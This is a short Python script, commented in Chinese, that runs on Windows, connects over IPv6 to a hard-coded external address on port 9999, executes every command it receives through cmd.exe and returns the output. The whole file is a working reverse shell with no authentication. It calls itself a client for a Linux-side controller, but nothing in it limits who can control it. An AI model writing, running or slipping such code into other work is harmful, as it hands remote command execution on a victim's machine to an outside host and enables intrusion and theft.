import socket
import subprocess

# Linux服务器的IPv6地址和端口
SERVER_IPV6 = '2a13:b487:4f01:ae86::db'
PORT = 9999

def handle_input_output(client_socket):
    try:
        while True:
            # 从Linux端接收命令
            data = client_socket.recv(1024)
            if not data:
                break  # 如果没有数据，退出

            # 使用 /c 参数让 cmd 执行命令并退出，不显示欢迎信息
            command = data.decode('utf-8').strip()
            process = subprocess.Popen(['cmd.exe', '/c', command], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()

            # 将命令执行结果发送回Linux端
            client_socket.send(stdout.encode('utf-8'))
            client_socket.send(stderr.encode('utf-8'))

    except Exception as e:
        print(f"Error in input/output handling: {e}")
    finally:
        client_socket.close()

def main():
    print("Starting Windows client...")

    # 创建一个socket连接
    with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((SERVER_IPV6, PORT))
        print(f"Connected to {SERVER_IPV6}:{PORT}")

        # 启动并进入一个循环，监听并执行来自Linux的命令
        handle_input_output(client_socket)

if __name__ == "__main__":
    main()
